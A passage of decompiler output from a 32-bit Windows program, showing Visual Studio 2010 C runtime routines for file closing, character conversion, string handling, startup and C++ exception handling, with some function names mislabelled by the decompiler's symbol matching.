    *piVar1 = 0x16;
    FUN_003b60f9();
  }
  return 0;
}



void FUN_003b24db(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 0x14));
  return;
}



// Library Function - Single Match
//  __fclose_nolock
// 
// Library: Visual Studio 2010 Release

int __cdecl __fclose_nolock(FILE *_File)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  
  iVar3 = -1;
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_003b60f9();
    iVar3 = -1;
  }
  else {
    if ((*(byte *)&_File->_flag & 0x83) != 0) {
      iVar3 = __flush(_File);
      __freebuf(_File);
      iVar2 = __fileno(_File);
      iVar2 = __close(iVar2);
      if (iVar2 < 0) {
        iVar3 = -1;
      }
      else {
        if (_File->_tmpfname != (char *)0x0) {
          _free(_File->_tmpfname);
          _File->_tmpfname = (char *)0x0;
        }
      }
    }
    _File->_flag = 0;
  }
  return iVar3;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fclose
// 
// Library: Visual Studio 2010 Release

int __cdecl _fclose(FILE *_File)

{
  int *piVar1;
  int local_20;
  
  local_20 = -1;
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_003b60f9();
    local_20 = -1;
  }
  else {
    if ((*(byte *)&_File->_flag & 0x40) == 0) {
      __lock_file(_File);
      local_20 = __fclose_nolock(_File);
      FUN_003b25be();
    }
    else {
      _File->_flag = 0;
    }
  }
  return local_20;
}



void FUN_003b25be(void)

{
  FILE *unaff_ESI;
  
  __unlock_file(unaff_ESI);
  return;
}



// Library Function - Single Match
//  __tolower_l
// 
// Library: Visual Studio 2010 Release

int __cdecl __tolower_l(int _C,_locale_t _Locale)

{
  uint uVar1;
  int iVar2;
  int *piVar3;
  localeinfo_struct local_1c;
  int local_14;
  char local_10;
  byte local_c;
  undefined local_b;
  CHAR local_8;
  CHAR local_7;
  undefined local_6;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_1c,_Locale);
  if ((uint)_C < 0x100) {
    if ((int)(local_1c.locinfo)->locale_name[3] < 2) {
      uVar1 = *(ushort *)(local_1c.locinfo[1].lc_category[0].locale + _C * 2) & 1;
    }
    else {
      uVar1 = __isctype_l(_C,1,(_locale_t)&local_1c);
    }
    if (uVar1 == 0) {
LAB_003b2627:
      if (local_10 == '\0') {
        return _C;
      }
      *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
      return _C;
    }
    uVar1 = (uint)*(byte *)((int)local_1c.locinfo[1].lc_category[0].wlocale + _C);
  }
  else {
    if (((int)(local_1c.locinfo)->locale_name[3] < 2) ||
       (iVar2 = __isleadbyte_l(_C >> 8 & 0xff,(_locale_t)&local_1c), iVar2 == 0)) {
      piVar3 = __errno();
      *piVar3 = 0x2a;
      local_7 = '\0';
      iVar2 = 1;
      local_8 = (CHAR)_C;
    }
    else {
      _C._0_1_ = (CHAR)((uint)_C >> 8);
      local_8 = (CHAR)_C;
      local_6 = 0;
      iVar2 = 2;
      local_7 = (CHAR)_C;
    }
    iVar2 = ___crtLCMapStringA((_locale_t)&local_1c,(local_1c.locinfo)->lc_category[0].wlocale,0x100
                               ,&local_8,iVar2,(LPSTR)&local_c,3,(local_1c.locinfo)->lc_codepage,1);
    if (iVar2 == 0) goto LAB_003b2627;
    uVar1 = (uint)local_c;
    if (iVar2 != 1) {
      uVar1 = (uint)CONCAT11(local_c,local_b);
    }
  }
  if (local_10 != '\0') {
    *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
  }
  return uVar1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  _tolower
// 
// Library: Visual Studio 2010 Release

int __cdecl _tolower(int _C)

{
  if (_DAT_003d7cf8 == 0) {
    if (_C - 0x41U < 0x1a) {
      return _C + 0x20;
    }
  }
  else {
    _C = __tolower_l(_C,(_locale_t)0x0);
  }
  return _C;
}



longlong __cdecl FUN_003b2707(wchar_t *param_1)

{
  longlong lVar1;
  
  lVar1 = __wcstoi64(param_1,(wchar_t **)0x0,10);
  return lVar1;
}



// Library Function - Single Match
//  _memmove_s
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl _memmove_s(void *_Dst,rsize_t _DstSize,void *_Src,rsize_t _MaxCount)

{
  int *piVar1;
  errno_t eVar2;
  
  if (_MaxCount == 0) {
LAB_003b276b:
    eVar2 = 0;
  }
  else {
    if ((_Dst == (void *)0x0) || (_Src == (void *)0x0)) {
      piVar1 = __errno();
      eVar2 = 0x16;
      *piVar1 = 0x16;
    }
    else {
      if (_MaxCount <= _DstSize) {
        FID_conflict__memcpy(_Dst,_Src,_MaxCount);
        goto LAB_003b276b;
      }
      piVar1 = __errno();
      eVar2 = 0x22;
      *piVar1 = 0x22;
    }
    FUN_003b60f9();
  }
  return eVar2;
}



// Library Function - Single Match
//  _sprintf_s
// 
// Library: Visual Studio 2010 Release

int __cdecl _sprintf_s(char *_DstBuf,size_t _SizeInBytes,char *_Format,...)

{
  int iVar1;
  
  iVar1 = __vsprintf_s_l(_DstBuf,_SizeInBytes,_Format,(_locale_t)0x0,&stack0x00000010);
  return iVar1;
}



// Library Function - Single Match
//  _localeconv
// 
// Library: Visual Studio 2010 Release

lconv * __cdecl _localeconv(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if ((p_Var1->ptlocinfo != (pthreadlocinfo)PTR_DAT_003d6de0) &&
     ((p_Var1->_ownlocale & DAT_003d6b98) == 0)) {
    ___updatetlocinfo();
  }
  return (lconv *)PTR_PTR_DAT_003d64b8;
}



void __cdecl FUN_003b27b4(ulong param_1)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  p_Var1->_holdrand = param_1;
  return;
}



uint FUN_003b27c6(void)

{
  _ptiddata p_Var1;
  uint uVar2;
  
  p_Var1 = __getptd();
  uVar2 = p_Var1->_holdrand * 0x343fd + 0x269ec3;
  p_Var1->_holdrand = uVar2;
  return uVar2 >> 0x10 & 0x7fff;
}



// Library Function - Single Match
//  _strcspn
// 
// Library: Visual Studio 2010 Release

size_t __cdecl _strcspn(char *_Str,char *_Control)

{
  byte bVar1;
  byte *pbVar2;
  size_t sVar3;
  undefined4 uStack40;
  undefined4 uStack36;
  undefined4 uStack32;
  undefined4 uStack28;
  undefined4 uStack24;
  undefined4 uStack20;
  undefined4 uStack16;
  undefined4 uStack12;
  
  uStack12 = 0;
  uStack16 = 0;
  uStack20 = 0;
  uStack24 = 0;
  uStack28 = 0;
  uStack32 = 0;
  uStack36 = 0;
  uStack40 = 0;
  for (; bVar1 = *_Control, bVar1 != 0; _Control = (char *)((byte *)_Control + 1)) {
    pbVar2 = (byte *)((int)&uStack40 + ((int)(uint)bVar1 >> 3));
    *pbVar2 = *pbVar2 | '\x01' << (bVar1 & 7);
  }
  sVar3 = 0xffffffff;
  do {
    sVar3 = sVar3 + 1;
    bVar1 = *_Str;
    if (bVar1 == 0) {
      return sVar3;
    }
    _Str = (char *)((byte *)_Str + 1);
  } while ((*(byte *)((int)&uStack40 + ((int)(uint)bVar1 >> 3)) >> (bVar1 & 7) & 1) == 0);
  return sVar3;
}



// Library Function - Single Match
//  _fast_error_exit
// 
// Library: Visual Studio 2010 Release

void __cdecl _fast_error_exit(int param_1)

{
  if (DAT_003d7cf4 == 1) {
    __FF_MSGBANNER();
  }
  __NMSG_WRITE(param_1);
  FUN_003b5906(0xff);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Removing unreachable block (ram,0x003b2898)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

int _SSL_load_error_strings(void)

{
  int iVar1;
  _STARTUPINFOW local_6c;
  int local_24;
  int local_20;
  undefined4 uStack12;
  undefined *local_8;
  
  ___security_init_cookie();
  local_8 = &DAT_003d2be8;
  uStack12 = 0x3b286b;
  GetStartupInfoW((LPSTARTUPINFOW)&local_6c);
  if (_DAT_003ea17c == 0) {
    HeapSetInformation((HANDLE)0x0,HeapEnableTerminationOnCorruption,(PVOID)0x0,0);
  }
  local_20 = 0;
  iVar1 = __heap_init();
  if (iVar1 == 0) {
    _fast_error_exit(0x1c);
  }
  iVar1 = __mtinit();
  if (iVar1 == 0) {
    _fast_error_exit(0x10);
  }
  __RTC_Initialize();
  local_8 = (undefined *)0x0;
  iVar1 = __ioinit();
  if (iVar1 < 0) {
    __amsg_exit(0x1b);
  }
  DAT_003ea178 = GetCommandLineA();
  DAT_003d7cec = ___crtGetEnvironmentStringsA();
  iVar1 = __setargv();
  if (iVar1 < 0) {
    __amsg_exit(8);
  }
  iVar1 = __setenvp();
  if (iVar1 < 0) {
    __amsg_exit(9);
  }
  iVar1 = __cinit(1);
  if (iVar1 != 0) {
    __amsg_exit(iVar1);
  }
  __wincmdln();
  local_24 = FUN_003956b0();
  if (local_20 == 0) {
    _exit(local_24);
  }
  __cexit();
  return local_24;
}



// Library Function - Single Match
//  __CxxThrowException@8
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __CxxThrowException_8(undefined4 param_1,byte *param_2)

{
  int iVar1;
  DWORD *pDVar2;
  DWORD *pDVar3;
  DWORD local_24 [4];
  DWORD local_14;
  ULONG_PTR local_10;
  undefined4 local_c;
  byte *local_8;
  
  pDVar2 = &DAT_003c6914;
  pDVar3 = local_24;
  for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {
    *pDVar3 = *pDVar2;
    pDVar2 = pDVar2 + 1;
    pDVar3 = pDVar3 + 1;
  }
  local_c = param_1;
  local_8 = param_2;
  if ((param_2 != (byte *)0x0) && ((*param_2 & 8) != 0)) {
    local_10 = 0x1994000;
  }
  RaiseException(local_24[0],local_24[1],local_14,&local_10);
  return;
}



// Library Function - Single Match
//  __purecall
// 
// Library: Visual Studio 2010 Release

void __purecall(void)

{
  code *pcVar1;
  
  pcVar1 = (code *)DecodePointer(Ptr_003d89d8);
  if (pcVar1 != (code *)0x0) {
    (*pcVar1)();
  }
  __NMSG_WRITE(0x19);
  __set_abort_behavior(0,1);
  _abort();
  return;
}



// Library Function - Single Match
//  void __stdcall _JumpToContinuation(void *,struct EHRegistrationNode *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void _JumpToContinuation(void *param_1,EHRegistrationNode *param_2)

{
  undefined4 *in_FS_OFFSET;
  
  *in_FS_OFFSET = *(undefined4 *)*in_FS_OFFSET;
                    // WARNING: Could not recover jumptable at 0x003b2a77. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)param_1)();
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  void __stdcall _CallMemberFunction1(void *,void *,void *)
//  void __stdcall _CallMemberFunction2(void *,void *,void *,int)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void FID_conflict__CallMemberFunction1(undefined4 param_1,undefined *UNRECOVERED_JUMPTABLE)

{
                    // WARNING: Could not recover jumptable at 0x003b2a83. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)UNRECOVERED_JUMPTABLE)();
  return;
}



// Library Function - Single Match
//  void __stdcall _UnwindNestedFrames(struct EHRegistrationNode *,struct EHExceptionRecord *)
// 
// Library: Visual Studio 2010 Release

void _UnwindNestedFrames(EHRegistrationNode *param_1,EHExceptionRecord *param_2)

{
  undefined4 *puVar1;
  undefined4 *in_FS_OFFSET;
  
  puVar1 = (undefined4 *)*in_FS_OFFSET;
  _release_context(param_1,(PVOID)0x3b2ab0,(PEXCEPTION_RECORD)param_2,(PVOID)0x0);
  *(uint *)(param_2 + 4) = *(uint *)(param_2 + 4) & 0xfffffffd;
  *puVar1 = *in_FS_OFFSET;
  *in_FS_OFFSET = puVar1;
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  ___CxxFrameHandler
//  ___CxxFrameHandler2
//  ___CxxFrameHandler3
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

undefined4 __cdecl
FID_conflict____CxxFrameHandler3
          (int *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4)

{
  _s_FuncInfo *in_EAX;
  undefined4 uVar1;
  
  uVar1 = ___InternalCxxFrameHandler
                    (param_1,param_2,param_3,param_4,in_EAX,0,(EHRegistrationNode *)0x0,0);
  return uVar1;
}



// Library Function - Single Match
//  enum _EXCEPTION_DISPOSITION __cdecl CatchGuardHandler(struct EHExceptionRecord *,struct
// CatchGuardRN *,void *,void *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

_EXCEPTION_DISPOSITION __cdecl
CatchGuardHandler(EHExceptionRecord *param_1,CatchGuardRN *param_2,void *param_3,void *param_4)

{
  _EXCEPTION_DISPOSITION _Var1;
  undefined4 in_EDX;
  undefined1 unaff_SI;
  
  terminate_if_debugger_present(*(uint *)(param_2 + 8) ^ (uint)param_2,in_EDX,unaff_SI);
  _Var1 = ___InternalCxxFrameHandler
                    ((int *)param_1,*(EHRegistrationNode **)(param_2 + 0x10),(_CONTEXT *)param_3,
                     (void *)0x0,*(_s_FuncInfo **)(param_2 + 0xc),*(int *)(param_2 + 0x14),
                     (EHRegistrationNode *)param_2,0);
  return _Var1;
}



// Library Function - Single Match
//  int __cdecl _CallSETranslator(struct EHExceptionRecord *,struct EHRegistrationNode *,void *,void
// *,struct _s_FuncInfo const *,int,struct EHRegistrationNode *)
// 
// Library: Visual Studio 2010 Release

int __cdecl
_CallSETranslator(EHExceptionRecord *param_1,EHRegistrationNode *param_2,void *param_3,void *param_4
                 ,_s_FuncInfo *param_5,int param_6,EHRegistrationNode *param_7)

{
  _ptiddata p_Var1;
  undefined4 **in_FS_OFFSET;
  int local_3c;
  EHExceptionRecord *local_38;
  void *local_34;
  code *local_30;
  undefined4 *local_2c;
  code *local_28;
  uint local_24;
  _s_FuncInfo *local_20;
  EHRegistrationNode *local_1c;
  int local_18;
  EHRegistrationNode *local_14;
  undefined *local_10;
  undefined *local_c;
  int local_8;
  
  local_c = &stack0xfffffffc;
  local_10 = &stack0xffffffc0;
  if (param_1 == (EHExceptionRecord *)0x123) {
    *(undefined4 *)param_2 = 0x3b2bed;
    local_3c = 1;
  }
  else {
    local_28 = TranslatorGuardHandler;
    local_24 = DAT_003d6664 ^ (uint)&local_2c;
    local_20 = param_5;
    local_1c = param_2;
    local_18 = param_6;
    local_14 = param_7;
    local_8 = 0;
    local_2c = *in_FS_OFFSET;
    *in_FS_OFFSET = &local_2c;
    local_38 = param_1;
    local_34 = param_3;
    p_Var1 = __getptd();
    local_30 = (code *)p_Var1->_translator;
    (*local_30)(*(undefined4 *)param_1,&local_38);
    local_3c = 0;
    if (local_8 == 0) {
      *in_FS_OFFSET = local_2c;
    }
    else {
      *local_2c = **in_FS_OFFSET;
      *in_FS_OFFSET = local_2c;
    }
  }
  return local_3c;
}



// Library Function - Single Match
//  enum _EXCEPTION_DISPOSITION __cdecl TranslatorGuardHandler(struct EHExceptionRecord *,struct
// TranslatorGuardRN *,void *,void *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

_EXCEPTION_DISPOSITION __cdecl
TranslatorGuardHandler
          (EHExceptionRecord *param_1,TranslatorGuardRN *param_2,void *param_3,void *param_4)

{
  _EXCEPTION_DISPOSITION _Var1;
  undefined4 in_EDX;
  undefined1 unaff_BL;
  code *local_8;
  
  terminate_if_debugger_present(*(uint *)(param_2 + 8) ^ (uint)param_2,in_EDX,unaff_BL);
  if ((*(uint *)(param_1 + 4) & 0x66) != 0) {
    *(undefined4 *)(param_2 + 0x24) = 1;
    return 1;
  }
  ___InternalCxxFrameHandler
            ((int *)param_1,*(EHRegistrationNode **)(param_2 + 0x10),(_CONTEXT *)param_3,(void *)0x0
             ,*(_s_FuncInfo **)(param_2 + 0xc),*(int *)(param_2 + 0x14),
             *(EHRegistrationNode **)(param_2 + 0x18),1);
  if (*(int *)(param_2 + 0x24) == 0) {
    _UnwindNestedFrames((EHRegistrationNode *)param_2,param_1);
  }
  _CallSETranslator((EHExceptionRecord *)0x123,(EHRegistrationNode *)&local_8,(void *)0x0,
                    (void *)0x0,(_s_FuncInfo *)0x0,0,(EHRegistrationNode *)0x0);
                    // WARNING: Could not recover jumptable at 0x003b2cb0. Too many branches
                    // WARNING: Treating indirect jump as call
  _Var1 = (*local_8)();
  return _Var1;
}



// Library Function - Single Match
//  struct _s_TryBlockMapEntry const * __cdecl _GetRangeOfTrysToCheck(struct _s_FuncInfo const
// *,int,int,unsigned int *,unsigned int *)
// 
// Library: Visual Studio 2010 Release

_s_TryBlockMapEntry * __cdecl
_GetRangeOfTrysToCheck
          (_s_FuncInfo *param_1,int param_2,int param_3,unsigned_int *param_4,unsigned_int *param_5)

{
  TryBlockMapEntry *pTVar1;
  uint uVar2;
  TryBlockMapEntry *pTVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  
  pTVar1 = param_1->pTryBlockMap;
  uVar6 = param_1->nTryBlocks;
  uVar2 = uVar6;
  uVar4 = uVar6;
  while (uVar5 = uVar2, -1 < param_2) {
    if (uVar6 == 0xffffffff) {
      _inconsistency();
    }
    uVar6 = uVar6 - 1;
    pTVar3 = pTVar1 + uVar6;
    if (((pTVar3->tryHigh < param_3) && (param_3 <= pTVar3->catchHigh)) ||
       (uVar2 = uVar5, uVar6 == 0xffffffff)) {
      param_2 = param_2 + -1;
      uVar2 = uVar6;
      uVar4 = uVar5;
    }
  }
  uVar6 = uVar6 + 1;
  *param_4 = uVar6;
  *param_5 = uVar4;
  if ((param_1->nTryBlocks <= uVar4 && uVar4 != param_1->nTryBlocks) || (uVar4 < uVar6)) {
    _inconsistency();
  }
  return (_s_TryBlockMapEntry *)(pTVar1 + uVar6);
}



// Library Function - Single Match
//  __CreateFrameInfo
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

undefined4 * __cdecl __CreateFrameInfo(undefined4 *param_1,undefined4 param_2)

{
  _ptiddata p_Var1;
  
  *param_1 = param_2;
  p_Var1 = __getptd();
  param_1[1] = p_Var1->_pFrameInfoChain;
  p_Var1 = __getptd();
  p_Var1->_pFrameInfoChain = param_1;
  return param_1;
}



// Library Function - Single Match
//  __IsExceptionObjectToBeDestroyed
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

undefined4 __cdecl __IsExceptionObjectToBeDestroyed(int param_1)

{
  _ptiddata p_Var1;
  int *piVar2;
  
  p_Var1 = __getptd();
  piVar2 = (int *)p_Var1->_pFrameInfoChain;
  while( true ) {
    if (piVar2 == (int *)0x0) {
      return 1;
    }
    if (*piVar2 == param_1) break;
    piVar2 = (int *)piVar2[1];
  }
  return 0;
}



// Library Function - Single Match
//  __FindAndUnlinkFrame
// 
// Library: Visual Studio 2010 Release

void __cdecl __FindAndUnlinkFrame(void *param_1)

{
  void *pvVar1;
  _ptiddata p_Var2;
  void *pvVar3;
  
  p_Var2 = __getptd();
  if (param_1 == p_Var2->_pFrameInfoChain) {
    p_Var2 = __getptd();
    p_Var2->_pFrameInfoChain = *(void **)((int)param_1 + 4);
  }
  else {
    p_Var2 = __getptd();
    pvVar1 = p_Var2->_pFrameInfoChain;
    do {
      pvVar3 = pvVar1;
      if (*(int *)((int)pvVar3 + 4) == 0) {
        _inconsistency();
        return;
      }
      pvVar1 = *(void **)((int)pvVar3 + 4);
    } while (param_1 != *(void **)((int)pvVar3 + 4));
    *(undefined4 *)((int)pvVar3 + 4) = *(undefined4 *)((int)param_1 + 4);
  }
  return;
}



// Library Function - Single Match
//  void * __cdecl _CallCatchBlock2(struct EHRegistrationNode *,struct _s_FuncInfo const *,void
// *,int,unsigned long)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void * __cdecl
_CallCatchBlock2(EHRegistrationNode *param_1,_s_FuncInfo *param_2,void *param_3,int param_4,
                unsigned_long param_5)

{
  void *pvVar1;
  int **in_FS_OFFSET;
  int *local_1c;
  code *local_18;
  uint local_14;
  _s_FuncInfo *local_10;
  EHRegistrationNode *local_c;
  int local_8;
  
  local_14 = DAT_003d6664 ^ (uint)&local_1c;
  local_10 = param_2;
  local_8 = param_4 + 1;
  local_18 = CatchGuardHandler;
  local_c = param_1;
  local_1c = *in_FS_OFFSET;
  *in_FS_OFFSET = (int *)&local_1c;
  pvVar1 = (void *)__CallSettingFrame_12(param_3,param_1,param_5);
  *in_FS_OFFSET = local_1c;
  return pvVar1;
}



// WARNING: This is an inlined function
// WARNING: Unable to track spacebase fully for stack
// WARNING: Variable defined which should be unmapped: param_1
// Library Function - Single Match
//  __EH_prolog3
// 
// Libraries: Visual Studio 2005, Visual Studio 2008, Visual Studio 2010, Visual Studio 2012

void __cdecl __EH_prolog3(int param_1)

{
  int iVar1;
  undefined4 unaff_EBX;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  int *in_FS_OFFSET;
  undefined4 unaff_retaddr;
  uint auStack28 [5];
  undefined local_8 [8];
  
  iVar1 = -param_1;
  *(undefined4 *)((int)auStack28 + iVar1 + 0x10) = unaff_EBX;
  *(undefined4 *)((int)auStack28 + iVar1 + 0xc) = unaff_ESI;
  *(undefined4 *)((int)auStack28 + iVar1 + 8) = unaff_EDI;
  *(uint *)((int)auStack28 + iVar1 + 4) = DAT_003d6664 ^ (uint)&param_1;
  *(undefined4 *)((int)auStack28 + iVar1) = unaff_retaddr;
  *in_FS_OFFSET = (int)local_8;
  return;
}



// WARNING: This is an inlined function
// WARNING: Unable to track spacebase fully for stack
// WARNING: Variable defined which should be unmapped: param_1
// Library Function - Single Match
//  __EH_prolog3_catch
// 
// Libraries: Visual Studio 2005, Visual Studio 2008, Visual Studio 2010, Visual Studio 2012

void __cdecl __EH_prolog3_catch(int param_1)

{
  int iVar1;
  undefined4 unaff_EBX;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  int *in_FS_OFFSET;
  undefined4 unaff_retaddr;
  uint auStack28 [5];
  undefined local_8 [8];
  
  iVar1 = -param_1;
  *(undefined4 *)((int)auStack28 + iVar1 + 0x10) = unaff_EBX;
  *(undefined4 *)((int)auStack28 + iVar1 + 0xc) = unaff_ESI;
  *(undefined4 *)((int)auStack28 + iVar1 + 8) = unaff_EDI;
  *(uint *)((int)auStack28 + iVar1 + 4) = DAT_003d6664 ^ (uint)&param_1;
  *(undefined4 *)((int)auStack28 + iVar1) = unaff_retaddr;
  *in_FS_OFFSET = (int)local_8;
  return;
}



// WARNING: This is an inlined function
// Library Function - Single Match
//  __EH_epilog3
// 
// Libraries: Visual Studio 2005, Visual Studio 2008, Visual Studio 2010, Visual Studio 2012

void __EH_epilog3(void)

{
  undefined4 *unaff_EBP;
  undefined4 *in_FS_OFFSET;
  undefined4 unaff_retaddr;
  
  *in_FS_OFFSET = unaff_EBP[-3];
  *unaff_EBP = unaff_retaddr;
  return;
}



// Library Function - Single Match
//  __get_sys_err_msg
// 
// Library: Visual Studio 2010 Release

char * __cdecl __get_sys_err_msg(int m)

{
  int *piVar1;
  undefined **ppuVar2;
  
  if (-1 < m) {
    piVar1 = (int *)_GOST_KEY_TRANSPORT_it();
    if (m < *piVar1) goto LAB_003b2eca;
  }
  piVar1 = (int *)_GOST_KEY_TRANSPORT_it();
  m = *piVar1;
LAB_003b2eca:
  ppuVar2 = _GOST_KEY_TRANSPORT_it();
  return ppuVar2[m];
}



// Library Function - Single Match
//  _strerror
// 
// Library: Visual Studio 2010 Release

char * __cdecl _strerror(char *_ErrMsg)

{
  code *pcVar1;
  _ptiddata p_Var2;
  char *pcVar3;
  char *_Src;
  errno_t eVar4;
  
  p_Var2 = __getptd_noexit();
  if (p_Var2 == (_ptiddata)0x0) {
    pcVar3 = "Visual C++ CRT: Not enough memory to complete call to strerror.";
  }
  else {
    if (p_Var2->_errmsg == (char *)0x0) {
      pcVar3 = (char *)__calloc_crt(0x86,1);
      p_Var2->_errmsg = pcVar3;
      if (pcVar3 == (char *)0x0) {
        return "Visual C++ CRT: Not enough memory to complete call to strerror.";
      }
    }
    pcVar3 = p_Var2->_errmsg;
    _Src = __get_sys_err_msg((int)_ErrMsg);
    eVar4 = _strcpy_s(pcVar3,0x86,_Src);
    if (eVar4 != 0) {
      __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      pcVar1 = (code *)swi(3);
      pcVar3 = (char *)(*pcVar1)();
      return pcVar3;
    }
  }
  return pcVar3;
}



// Library Function - Single Match
//  __copytlocinfo_nolock
// 
// Library: Visual Studio 2010 Release

void __fastcall __copytlocinfo_nolock(LONG *param_1)

{
  LONG *in_EAX;
  int iVar1;
  LONG *pLVar2;
  
  if (((param_1 != (LONG *)0x0) && (in_EAX != (LONG *)0x0)) && (in_EAX != param_1)) {
    pLVar2 = in_EAX;
    for (iVar1 = 0x36; iVar1 != 0; iVar1 = iVar1 + -1) {
      *pLVar2 = *param_1;
      param_1 = param_1 + 1;
      pLVar2 = pLVar2 + 1;
    }
    *in_EAX = 0;
    ___addlocaleref(in_EAX);
  }
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

void __cdecl FUN_003b2f65(LONG **param_1)

{
  int *piVar1;
  LONG LVar2;
  
  if (param_1 != (LONG **)0x0) {
    __lock(0xd);
    if (param_1[1] != (LONG *)0x0) {
      LVar2 = InterlockedDecrement(param_1[1]);
      if ((LVar2 == 0) && (param_1[1] != (LONG *)&DAT_003d6678)) {
        _free(param_1[1]);
      }
    }
    FUN_003b3012();
    if (*param_1 != (LONG *)0x0) {
      __lock(0xc);
      ___removelocaleref(*param_1);
      piVar1 = *param_1;
      if (((piVar1 != (int *)0x0) && (*piVar1 == 0)) && (piVar1 != (int *)&DAT_003d6d08)) {
        ___freetlocinfo(piVar1);
      }
      FUN_003b301e();
    }
    *param_1 = (LONG *)0xbaadf00d;
    param_1[1] = (LONG *)0xbaadf00d;
    _free(param_1);
  }
  return;
}



void FUN_003b3012(void)

{
  FUN_003b8677(0xd);
  return;
}



void FUN_003b301e(void)

{
  FUN_003b8677(0xc);
  return;
}



// Library Function - Single Match
//  __strcats
// 
// Library: Visual Studio 2010 Release

void __cdecl __strcats(char *param_1,rsize_t param_2,char *param_3)

{
  code *pcVar1;
  errno_t eVar2;
  char **ppcVar3;
  int iVar4;
  
  iVar4 = 0;
  if (0 < (int)param_3) {
    ppcVar3 = &param_3;
    do {
      ppcVar3 = ppcVar3 + 1;
      eVar2 = _strcat_s(param_1,param_2,*ppcVar3);
      if (eVar2 != 0) {
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
        pcVar1 = (code *)swi(3);
        (*pcVar1)();
        return;
      }
      iVar4 = iVar4 + 1;
    } while (iVar4 < (int)param_3);
  }
  return;
}



// Library Function - Single Match
//  ___lc_strtolc
// 
// Library: Visual Studio 2010 Release

undefined4 __cdecl ___lc_strtolc(undefined (*param_1) [16],byte *param_2)

{
  byte bVar1;
  errno_t eVar2;
  byte *_MaxCount;
  byte *pbVar3;
  byte *_Str;
  bool bVar4;
  undefined (*_Dst) [16];
  rsize_t _SizeInBytes;
  wchar_t *pwVar5;
  undefined (*pauVar6) [16];
  uint uVar7;
  uintptr_t uVar8;
  
  uVar8 = 0x90;
  pbVar3 = (byte *)0x0;
  uVar7 = 0;
  pwVar5 = L"\xe2e9";
  pauVar6 = param_1;
  trim_string(param_1,0,0x90);
  if (*param_2 != 0) {
    _Str = param_2;
    if (*param_2 != 0x2e) goto LAB_003b30c9;
    if (param_2[1] == 0) goto LAB_003b30c9;
    eVar2 = _strncpy_s((char *)param_1[8],0x10,(char *)(param_2 + 1),0xf);
    if (eVar2 != 0) {
      uVar8 = 0;
      uVar7 = 0;
      pauVar6 = (undefined (*) [16])0x0;
      pwVar5 = (wchar_t *)0x0;
      do {
        __invoke_watson((wchar_t *)0x0,pwVar5,(wchar_t *)pauVar6,uVar7,uVar8);
LAB_003b30c9:
        _MaxCount = (byte *)_strcspn((char *)_Str,"_.,");
        bVar4 = _MaxCount == pbVar3;
        param_2 = pbVar3;
        while( true ) {
          if (bVar4) {
            return 0xffffffff;
          }
          bVar1 = _MaxCount[(int)_Str];
          pbVar3 = (byte *)(uint)bVar1;
          if (param_2 == (byte *)0x0) {
            if ((byte *)0x3f < _MaxCount) {
              return 0xffffffff;
            }
            if (bVar1 == 0x2e) {
              return 0xffffffff;
            }
            _SizeInBytes = 0x40;
            _Dst = param_1;
          }
          else {
            if (param_2 == (byte *)0x1) {
              if ((byte *)0x3f < _MaxCount) {
                return 0xffffffff;
              }
              if (bVar1 == 0x5f) {
                return 0xffffffff;
              }
              _SizeInBytes = 0x40;
              _Dst = param_1[4];
            }
            else {
              if (param_2 != (byte *)0x2) {
                return 0xffffffff;
              }
              if ((byte *)0xf < _MaxCount) {
                return 0xffffffff;
              }
              if ((bVar1 != 0) && (bVar1 != 0x2c)) {
                return 0xffffffff;
              }
              _SizeInBytes = 0x10;
              _Dst = param_1[8];
            }
          }
          eVar2 = _strncpy_s((char *)_Dst,_SizeInBytes,(char *)_Str,(rsize_t)_MaxCount);
          if (eVar2 != 0) break;
          if (bVar1 == 0x2c) {
            return 0;
          }
          if (bVar1 == 0) {
            return 0;
          }
          param_2 = param_2 + 1;
          _Str = _MaxCount + (int)_Str + 1;
